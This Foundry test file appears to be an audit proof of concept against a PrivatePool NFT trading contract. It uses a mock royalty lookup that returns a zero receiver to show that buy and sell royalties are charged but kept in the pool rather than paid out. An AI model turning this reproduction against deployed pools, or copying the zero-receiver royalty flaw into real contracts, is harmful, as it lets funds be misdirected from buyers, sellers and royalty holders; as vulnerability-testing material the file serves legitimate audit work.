pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../../src/PrivatePool.sol";

import "solmate/tokens/ERC20.sol";
import "solmate/tokens/ERC721.sol";
import "openzeppelin/interfaces/IERC2981.sol";
import {IRoyaltyRegistry} from "royalty-registry-solidity/IRoyaltyRegistry.sol";

/*//////////////////////////////////////////////////////////////
                            MOCKS
//////////////////////////////////////////////////////////////*/

contract MockERC20 is ERC20("MockToken", "MOCK", 18) {
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockNFT is ERC721 {
    constructor() ERC721("MockNFT", "MNFT") {}

    function mint(address to, uint256 id) external {
        _mint(to, id);
    }

    /* solmate’s ERC721 requires overriding tokenURI but it is unused */
    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

contract ZeroReceiverRoyalty is IERC2981 {
    /* 
        Returns a royalty of 10% but a zero receiver,
        which will trigger the bug inside PrivatePool.
    */
    function royaltyInfo(uint256, uint256 salePrice)
        external
        pure
        override
        returns (address receiver, uint256 royaltyAmount)
    {
        receiver = address(0); // <–– receiver is deliberately zero!
        royaltyAmount = salePrice / 10; // 10% royalty
    }

    function supportsInterface(bytes4 interfaceId) external pure override returns (bool) {
        return interfaceId == type(IERC2981).interfaceId;
    }
}

/* Simplified factory needed only for ownerOf and protocolFeeRate */
contract MockFactory {
    mapping(uint256 => address) public _owners;

    function setOwner(address pool, address owner) external {
        _owners[uint256(uint160(pool))] = owner;
    }

    function ownerOf(uint256 id) external view returns (address) {
        return _owners[id];
    }

    /* keep protocol fee zero to simplify maths */
    function protocolFeeRate() external pure returns (uint16) {
        return 0;
    }
}

/* Minimal royalty-registry mock */
contract MockRoyaltyRegistry is IRoyaltyRegistry {
    mapping(address => address) public override getRoyaltyLookupAddress;

    function setRoyaltyLookupAddress(address token, address lookup) external {
        getRoyaltyLookupAddress[token] = lookup;
    }
}

/*//////////////////////////////////////////////////////////////
                        EXPLOIT TEST
//////////////////////////////////////////////////////////////*/

contract ExploitTest is Test {
    /* Test actors */
    address owner = address(0xABCD);
    address buyer = address(0xBEEF);
    address seller = address(0xCAFE);

    /* Contracts */
    MockERC20 baseToken;
    MockNFT nft;
    MockFactory factory;
    MockRoyaltyRegistry royaltyRegistry;
    ZeroReceiverRoyalty royaltyImpl;
    PrivatePool pool;

    /* Constants */
    uint256 constant ONE_NFT_WEIGHT = 1e18;

    function setUp() public {
        /* Deploy mocks */
        baseToken = new MockERC20();
        nft = new MockNFT();
        factory = new MockFactory();
        royaltyRegistry = new MockRoyaltyRegistry();
        royaltyImpl = new ZeroReceiverRoyalty();

        /* point royalty registry to royalty implementation that returns zero receiver */
        royaltyRegistry.setRoyaltyLookupAddress(address(nft), address(royaltyImpl));

        /* Deploy pool */
        pool = new PrivatePool(
            address(factory),
            address(royaltyRegistry),
            address(0) /* stolen oracle not used */
        );

        /* Register pool ownership so we can call privileged functions later if needed */
        factory.setOwner(address(pool), owner);

        /* Initialize pool with some reasonable virtual reserves.
           feeRate and changeFee are set to zero to isolate the royalty behaviour. */
        vm.prank(owner);
        pool.initialize(
            address(baseToken),               // base token
            address(nft),                     // NFT
            uint128(1_000 ether),             // virtual base reserves
            uint128(10 * ONE_NFT_WEIGHT),     // virtual nft reserves (10 NFTs)
            uint56(0),                        // changeFee
            uint16(0),                        // feeRate (bps)
            bytes32(0),                       // merkleRoot (weights all 1)
            false,                            // useStolenNftOracle
            true                              // payRoyalties –– MUST be true
        );

        /* Mint 1 NFT to pool so it has inventory to sell */
        nft.mint(address(this), 1);
        nft.approve(address(pool), 1);
        nft.safeTransferFrom(address(this), address(pool), 1);

        /* Give some ERC20 balances to test users */
        baseToken.mint(buyer, 1_000 ether);
        baseToken.mint(seller, 0); // seller will receive payment later
    }

    /*//////////////////////////////////////////////////////////////
                  BUY FLOW –– ROYALTY NOT FORWARDED
    //////////////////////////////////////////////////////////////*/

    function testBuyRoyaltyNotForwarded() public {
        /* Query quote BEFORE state-changes to obtain “clean” inputAmount
           (this value excludes royalty because the bug adds it later) */
        (uint256 quotedNetInput,,) = pool.buyQuote(ONE_NFT_WEIGHT);
        uint256 expectedRoyalty = quotedNetInput / 10; // 10% of sale price

        /* Prepare calldata */
        uint256[] memory ids = new uint256[](1);
        uint256[] memory weights = new uint256[](1);
        ids[0] = 1;
        weights[0] = ONE_NFT_WEIGHT;

        PrivatePool.MerkleMultiProof memory proof;
        proof.proof = new bytes32[](0);
        proof.flags = new bool[](0);

        /* Balances before */
        uint256 poolBalBefore = baseToken.balanceOf(address(pool));
        uint256 buyerBalBefore = baseToken.balanceOf(buyer);

        /* Execute buy as buyer */
        vm.startPrank(buyer);
        baseToken.approve(address(pool), type(uint256).max);
        (uint256 netInputAmount,,) = pool.buy(ids, weights, proof);
        vm.stopPrank();

        /* Sanity: netInputAmount should equal quote + royalty */
        assertEq(netInputAmount, quotedNetInput + expectedRoyalty, "Royalty wrongly calculated");

        /* Balances after */
        uint256 poolBalAfter = baseToken.balanceOf(address(pool));
        uint256 buyerBalAfter = baseToken.balanceOf(buyer);

        /* ================= Assertions ================= */

        /* 1. Buyer lost exactly netInputAmount */
        assertEq(
            buyerBalBefore - buyerBalAfter,
            netInputAmount,
            "Buyer did not pay the full netInputAmount"
        );

        /* 2. Pool gained ALL buyer payment (royalty was not forwarded) */
        assertEq(
            poolBalAfter - poolBalBefore,
            netInputAmount,
            "Pool balance incorrect – royalty not retained?"
        );

        /* 3. Nothing was forwarded to a royalty recipient
              (there is no recipient, but show explicitly).           */
        assertEq(
            baseToken.balanceOf(address(0)),
            0,
            "Royalty mistakenly forwarded to zero address"
        );
    }

    /*//////////////////////////////////////////////////////////////
                  SELL FLOW –– ROYALTY NOT FORWARDED
    //////////////////////////////////////////////////////////////*/

    function testSellRoyaltyNotForwarded() public {
        /* ------- Preparation: give seller an NFT to sell back ------- */
        uint256 sellTokenId = 2;
        nft.mint(seller, sellTokenId);
        vm.startPrank(seller);
        nft.approve(address(pool), sellTokenId);
        vm.stopPrank();

        /* Quote before sell */
        (uint256 quotedNetOutput,,) = pool.sellQuote(ONE_NFT_WEIGHT);
        uint256 expectedRoyalty = quotedNetOutput / 10; // 10% again

        /* Build parameters */
        uint256[] memory ids = new uint256[](1);
        uint256[] memory weights = new uint256[](1);
        ids[0] = sellTokenId;
        weights[0] = ONE_NFT_WEIGHT;

        PrivatePool.MerkleMultiProof memory proof;
        proof.proof = new bytes32[](0);
        proof.flags = new bool[](0);

        /* Balances before */
        uint256 poolBalBefore = baseToken.balanceOf(address(pool));
        uint256 sellerBalBefore = baseToken.balanceOf(seller);

        /* Execute sell */
        vm.startPrank(seller);
        (uint256 netOutputAmount,,) = pool.sell(ids, weights, proof, new IStolenNftOracle.Message[](0));
        vm.stopPrank();

        /* Sanity: netOutputAmount should equal quote – royalty */
        assertEq(
            netOutputAmount,
            quotedNetOutput - expectedRoyalty,
            "Royalty deduction unexpected"
        );

        /* Balances after */
        uint256 poolBalAfter = baseToken.balanceOf(address(pool));
        uint256 sellerBalAfter = baseToken.balanceOf(seller);

        /* ================= Assertions ================= */

        /* 1. Seller received only netOutputAmount (royalty withheld) */
        assertEq(
            sellerBalAfter - sellerBalBefore,
            netOutputAmount,
            "Seller did not receive expected payment"
        );

        /* 2. Pool balance reduced ONLY by netOutputAmount,
              meaning royalty stayed inside the pool                */
        assertEq(
            poolBalBefore - poolBalAfter,
            netOutputAmount,
            "Pool paid out more than netOutputAmount"
        );

        /* 3. Zero address still holds nothing */
        assertEq(
            baseToken.balanceOf(address(0)),
            0,
            "Royalty incorrectly forwarded in sell flow"
        );
    }
}